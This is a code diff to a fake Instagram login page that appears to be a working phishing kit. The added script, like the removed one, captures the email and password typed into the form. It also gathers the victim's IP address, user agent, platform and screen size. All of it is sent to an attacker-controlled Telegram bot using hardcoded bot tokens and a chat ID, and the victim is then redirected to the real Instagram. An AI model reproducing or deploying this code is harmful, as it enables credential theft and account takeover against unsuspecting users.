@@ -68,61 +68,62 @@
         <p class="copyright">© 2020 Instagram from Facebook</p>
     </footer>
 
-    <!-- JavaScript -->
-    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-    <script>
-        const TOKEN = "7730392726:AAF7vyF6jxYKuQjCqAJhkHo6FOuIKwiJD68";  // Your Telegram bot token
-        const CHAT_ID = "1496562309"; // Your chat ID (get from Telegram bot API)
-        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-        // Handle form submission
-        document.getElementById('login-form').addEventListener('submit', function(e) {
-            e.preventDefault(); // Prevent the default form submission
 
-            // Collect form data
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
 
-            // Get the user's IP address and other information
-            axios.get('https://api.ipify.org?format=json')
-                .then(response => {
-                    const ip = response.data.ip;
-                    const userAgent = navigator.userAgent;
-                    const platform = navigator.platform;
-                    const screenWidth = screen.width;
-                    const screenHeight = screen.height;
-                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+<!-- java هنا اسفل -->
 
-                    // Construct the message for Telegram bot
-                    const message = `
-                        <b>New Login Attempt</b>\n
-                        <b>Email:</b> ${email}\n
-                        <b>Password:</b> ${password}\n
-                        <b>IP Address:</b> ${ip}\n
-                        <b>Device Type:</b> ${deviceType}\n
-                        <b>Platform:</b> ${platform}\n
-                        <b>User Agent:</b> ${userAgent}\n
-                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
-                    `;
 
-                    // Send the login attempt information to Telegram bot
-                    axios.post(URI_API, {
-                        chat_id: CHAT_ID,
-                        parse_mode: 'html',
-                        text: message
-                    }).then(response => {
-                        alert('Information sent successfully!');
-                    }).catch(error => {
-                        alert('Error sending the information. Please try again.');
-                    });
-                })
-                .catch(error => {
-                    alert('Error fetching the IP address. Please try again.');
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "8133265514:AAH0HaMnbhf6_zWLUAWzt5yHE1DwYLguTV4";                                                            // هنا التوكين              
+    const CHAT_ID = "1496562309";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();  // Prevent form submission
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = ` 
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b> ${email}\n
+                    <b>Password:</b> ${password}\n
+                    <b>IP Address:</b> ${ip}\n
+                    <b>Device Type:</b> ${deviceType}\n
+                    <b>Platform:</b> ${platform}\n
+                    <b>User Agent:</b> ${userAgent}\n
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('Information sent successfully!');
+                    
+                    // Delay redirection to Instagram after the message is sent
+                    setTimeout(function() {
+                        window.location.href = 'https://www.instagram.com';  // Redirect to real Instagram
+                    }, 1000); // 1-second delay (you can adjust this value)
+                }).catch(error => {
+                    alert('Error sending the information. Please try again.');
                 });
-
-            // Redirect the user to the real Instagram login page
-            window.location.href = 'https://www.instagram.com/accounts/login/';
-        });
-    </script>
-</body>
-</html>
+            })
+            .catch(error => {
+                alert('Error fetching the IP address. Please try again.');
+            });
+    });
+</script>
